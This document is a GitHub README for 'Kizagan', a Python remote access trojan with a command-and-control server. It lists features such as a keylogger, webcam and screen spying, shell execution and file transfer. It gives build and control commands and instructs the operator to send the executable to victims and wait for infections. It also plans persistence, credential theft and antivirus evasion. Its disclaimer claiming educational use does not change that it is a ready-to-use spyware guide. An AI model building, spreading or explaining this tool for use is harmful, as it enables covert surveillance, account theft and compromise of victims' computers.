# KIZAGAN

Kizagan is a RAT,C2 tool built with python.Kizagan can build executables and control infected machines.

![a](https://github.com/st4inl3s5/kizagan/assets/68844502/704332a0-e02c-43f2-b651-0cb6434e0610)

## Features

+ Basic file/directory commands.(rename, delete, create etc.)

+ Download/Upload files.

+ Execute shell/terminal commands directly.

+ Take victim snap screenshot.

+ Watch live screen stream.

+ Take victim camera snapshot.

+ Watch live victim camera.

+ Advanced keylogger.

+ Merge executable with an arbitrary file.

## FEAUTURES TO DO

+ Encrypted connection

+ Persistence

+ Wifi names and passwords

+ Browser datas

+ Applications to make FUD

+ GUI

+ Access microphone

## SETUP

Clone the project or download the zip file and extract it.

    git clone https://github.com/st4inl3s5/kizagan

To make setup, use the following command :

    pip install -r requirements.txt

## USAGE

Build an executable file with following command :

    python3 kizagan.py build -ip <control_server_ip> -p <control_server_port> -i <your_icon_file> -m <your_merge_file> -n <executable_name>

![1](https://github.com/st4inl3s5/kizagan/assets/68844502/1c2decaa-b261-4369-9678-e979c90e7323)

![2](https://github.com/st4inl3s5/kizagan/assets/68844502/0c97768c-4472-4fda-a32f-9c849f508a3c)

![3](https://github.com/st4inl3s5/kizagan/assets/68844502/9d57d907-38ac-4e60-8f31-19c18a973ed8)

![4](https://github.com/st4inl3s5/kizagan/assets/68844502/6fd39e46-11dd-48fb-9a59-90e725642f3d)

Send the executable file to victims.

Start the control server with following command :

    python3 kizagan.py control -ip <control_server_ip> -p <control_server_port>

![5](https://github.com/st4inl3s5/kizagan/assets/68844502/4add8899-0614-4cb3-a752-f3a8243620e9)

![6](https://github.com/st4inl3s5/kizagan/assets/68844502/9e806d43-e82e-48f3-b4c9-85a7420c5797)

Wait for the victims to open your executable.When a victims open your executable, victims will appear in terminal :

![7](https://github.com/st4inl3s5/kizagan/assets/68844502/d3c6c598-9603-4bc9-8e1c-36618210fe75)

Press CTRL+C to interact with a victim :

![8](https://github.com/st4inl3s5/kizagan/assets/68844502/a3cdb668-63ce-42ba-8ed1-e5fa18cebac9)

Type 'help' to view help menu.

![9](https://github.com/st4inl3s5/kizagan/assets/68844502/b3ef8efd-f11e-4d48-937f-c852b36f4c75)

## MOTIVATION

[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/st4inl3s5)

My motivation to develop kizagan, your donations, improve my cyber and software knowledge.

## DISCLAIMER

This tool developed for educational and red team purposes.Don't use this tool for illegal purposes.I am not responsible for illegal actions.

So the kizagan under development, it can have bugs.Please report me the bugs you find.

## CONTACT

https://www.instagram.com/arduinocum.py/

https://t.me/+5XoMhXv4SghhYmE0
